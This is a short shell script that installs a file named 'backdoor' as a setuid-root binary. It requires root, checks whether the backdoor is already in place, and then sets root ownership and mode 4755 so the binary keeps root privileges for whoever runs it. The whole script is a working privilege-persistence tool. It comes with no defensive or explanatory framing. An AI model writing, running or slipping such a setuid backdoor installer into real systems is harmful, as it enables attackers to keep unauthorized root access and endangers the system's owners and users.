#! /bin/sh

BACKDOOR=backdoor
[ $# -ge 1 ] && BACKDOOR=$1

die() {
	echo $1 1>&2
	exit 1
}

[ -f ${BACKDOOR} ] || die "file not found: ${BACKDOOR}"
[ -x ${BACKDOOR} ] && [ -u ${BACKDOOR} ] && [ `stat -c '%g' ${BACKDOOR}` -eq 0 ] && echo "${BACKDOOR} already installed." && exit 0
[ `id -ru` -eq 0 ] || die "You must run that script as root."
chown 0:0 ${BACKDOOR} && chmod 4755 ${BACKDOOR} || die "Installation failed"
echo "Installation successful."
